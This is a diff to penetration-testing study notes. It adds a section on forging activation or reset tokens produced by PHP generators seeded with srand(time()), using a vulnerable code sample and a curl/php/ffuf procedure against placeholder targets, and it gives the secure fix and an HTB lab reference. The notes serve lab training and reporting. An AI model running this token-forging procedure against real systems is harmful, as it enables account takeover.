@@ -244,6 +244,65 @@ ffuf -w ./tokens.txt:FUZZ \
 > [!tip]
 > Before brute forcing, **analyze** a token you legitimately received: is it sequential, a timestamp, a short hash, base64 of the email/user-id? Predictable tokens are forged, not brute-forced. Also test token **reuse** (still valid after use?), **no expiry**, and whether *another* user's token is accepted (missing user↔token binding).
 
+### Seeded-PRNG tokens — long, random-looking, and still forgeable
+
+A token's strength is the entropy of its **seed**, not its length. A 32-character token from a 62-character alphabet is `62^32` ≈ 2.3e57 by brute force — but if it came from a PRNG seeded with something guessable, the real search space is the seed's range.
+
+```php
+// The classic: looks unbreakable, isn't
+function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());                       // <-- 1 second of entropy
+    $code = "";
+    for ($i = 0; $i < 32; $i++)
+        $code .= $chars[rand(0, strlen($chars) - 1)];
+    return $code;
+}
+```
+
+`srand(time())` means the entire 32-character output is determined by a **Unix timestamp in seconds** — which the server publishes in the `Date:` header of the very response confirming your action.
+
+| Uncertainty window | Candidates to try |
+|---|---|
+| ±5 seconds | 11 |
+| 1 hour | 3,600 |
+| 1 day | 86,400 |
+
+**Procedure:**
+
+```bash
+# 1. Trigger the token (register / request reset) and capture the Date header
+curl -skD- -X POST "https://<TARGET>/register.php" -d '<params>' | grep -i '^date:'
+
+# 2. Convert to epoch — this is your seed candidate
+date -u -d 'Wed, 18 Aug 2026 14:03:11 GMT' +%s
+
+# 3. Generate candidates by running the TARGET'S OWN function with each seed
+php -r '
+$chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+for($s=$argv[1]-5; $s<=$argv[1]; $s++){          // window only needs to go BACKWARD
+  srand($s); $c="";
+  for($i=0;$i<32;$i++) $c.=$chars[rand(0,strlen($chars)-1)];
+  echo $c,"\n";
+}' <epoch> > codes.txt
+
+# 4. Fuzz — match the SEMANTIC success string, never a byte count
+ffuf -w codes.txt -u 'https://<TARGET>/activate.php?code=FUZZ' -k -mr 'Account activated'
+```
+
+> [!warning]
+> **Don't reimplement the generator.** On PHP 7.1+ `rand()` is an alias of `mt_rand()` and `srand()` of `mt_srand()` — Mersenne Twister, not the old libc LCG. Copy the target's function verbatim into a local `php -r` and vary only the seed. Same code, same output; a hand-rolled PRNG will not match.
+
+> [!tip]
+> The window only needs to extend **backwards** from the `Date:` header — `time()` is called during request processing, before the response is stamped, so the true seed is always ≤ the header epoch.
+
+**Other guessable seeds and sources worth testing:** `uniqid()` (microtime-based — add microsecond brute force), `mt_rand()` without any `srand` (state recoverable from ~624 consecutive outputs), incrementing IDs, `md5(email)`, `md5(username . date)`, and anything base64 that decodes to something structured.
+
+**Correct construction, for the report:** `random_bytes()` / `bin2hex(random_bytes(16))` in PHP, `secrets` in Python, `crypto.randomBytes` in Node — a CSPRNG, never `rand`/`mt_rand`/`uniqid`.
+
+> [!note]
+> A predictable token is often the **gate** in front of a bigger bug rather than the finding itself. On HTB BroScience the activation-code prediction exists only to obtain a session, because the real vulnerability — a PHP object-injection sink — is behind `isset($_SESSION['id'])`. See [[Class notes/HTB Academy/CPTS v2 (claude)/Deserialization|Deserialization]].
+
 ### Host-header reset poisoning
 
 Many apps build the reset link from the incoming `Host` (or `X-Forwarded-Host`) header. Poison it so the victim's emailed link points at *your* server — when they click, the secret token lands in your logs.
@@ -415,5 +474,5 @@ echo 'YWRtaW46MjFiNzJjMGI3YWRjNTBjZmQ0N2E=' | base64 -d
 ---
 
 *Created: 2026-07-31*
-*Updated: 2026-07-31*
-*Model: claude-opus-4-8*
+*Updated: 2026-08-18*
+*Model: claude-opus-5*
